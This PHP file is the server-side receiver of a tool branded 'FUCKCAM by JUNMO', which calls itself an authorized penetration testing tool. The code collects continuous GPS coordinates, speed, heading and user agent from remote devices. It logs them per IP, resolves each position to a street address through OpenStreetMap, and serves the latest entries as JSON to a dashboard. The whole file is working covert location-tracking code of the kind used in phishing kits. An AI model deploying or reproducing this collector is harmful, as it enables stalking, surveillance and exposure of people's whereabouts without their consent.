<?php
/**
 * location.php - Real-Time Geolocation Receiver
 * FUCKCAM v2.0 by JUNMO — Continuous GPS Tracking
 * Authorized Penetration Testing Tool
 */

$logDir = __DIR__ . '/logs';
if (!is_dir($logDir)) {
    mkdir($logDir, 0755, true);
}

$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$timestamp = date('Y-m-d H:i:s');
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $lat = $_POST['lat'] ?? 'N/A';
    $lon = $_POST['lon'] ?? 'N/A';
    $accuracy = $_POST['accuracy'] ?? 'N/A';
    $speed = $_POST['speed'] ?? '0';
    $heading = $_POST['heading'] ?? '0';
    $city = $_POST['city'] ?? 'N/A';
    $country = $_POST['country'] ?? 'N/A';
    $deviceTime = $_POST['device_time'] ?? $timestamp;
    $ipFallback = $_POST['ip_fallback'] ?? 'false';

    // Build Google Maps link
    $gmapsLink = "https://www.google.com/maps?q=$lat,$lon";

    // Build detailed log entry
    $logEntry = "[$deviceTime] IP: $ip | Lat: $lat | Lon: $lon | Accuracy: {$accuracy}m | Speed: {$speed}m/s | Heading: {$heading}° | City: $city | Country: $country | Maps: $gmapsLink | FUCKCAM by JUNMO\n";
    
    // Append to continuous location log
    file_put_contents($logDir . '/location_log.txt', $logEntry, FILE_APPEND);
    
    // Save individual session file per IP (appends continuously)
    $ipFile = $logDir . '/location_' . md5($ip) . '.txt';
    $data = "Timestamp: $deviceTime\nIP: $ip\nLatitude: $lat\nLongitude: $lon\nAccuracy: {$accuracy}m\nSpeed: {$speed}m/s\nHeading: {$heading}°\nCity: $city\nCountry: $country\nGoogle Maps: $gmapsLink\nUser-Agent: $userAgent\nTool: FUCKCAM by JUNMO\n---\n";
    file_put_contents($ipFile, $data, FILE_APPEND);

    // Save latest position for quick dashboard access
    $latestData = "$deviceTime|$ip|$lat|$lon|$accuracy|$speed|$heading|$city|$country|$gmapsLink\n";
    file_put_contents($logDir . '/latest_location.txt', $latestData);

    // Reverse geocode with OpenStreetMap (only if accuracy is good, skip for IP fallback)
    if ($lat !== 'N/A' && $lon !== 'N/A' && $ipFallback !== 'true' && $accuracy < 1000) {
        $geoUrl = "https://nominatim.openstreetmap.org/reverse?format=json&lat=$lat&lon=$lon&addressdetails=1";
        $context = stream_context_create([
            'http' => [
                'timeout' => 3,
                'header' => "User-Agent: FUCKCAM-by-JUNMO/2.0\r\n"
            ]
        ]);
        $geoResponse = @file_get_contents($geoUrl, false, $context);
        if ($geoResponse) {
            $geoData = json_decode($geoResponse, true);
            if (isset($geoData['display_name'])) {
                $address = $geoData['display_name'];
                $addressLog = "[$deviceTime] IP: $ip | Address: $address | FUCKCAM by JUNMO\n";
                file_put_contents($logDir . '/address_log.txt', $addressLog, FILE_APPEND);
            }
        }
    }

    echo "LOCATION_RECEIVED";
} else {
    // GET - return all location entries as JSON for the dashboard
    header('Content-Type: application/json');
    $entries = [];
    if (file_exists($logDir . '/location_log.txt')) {
        $lines = file($logDir . '/location_log.txt');
        foreach (array_reverse($lines) as $line) {
            $entries[] = trim($line);
        }
    }
    echo json_encode([
        'count' => count($entries),
        'entries' => array_slice($entries, 0, 50)
    ], JSON_PRETTY_PRINT);
}
?>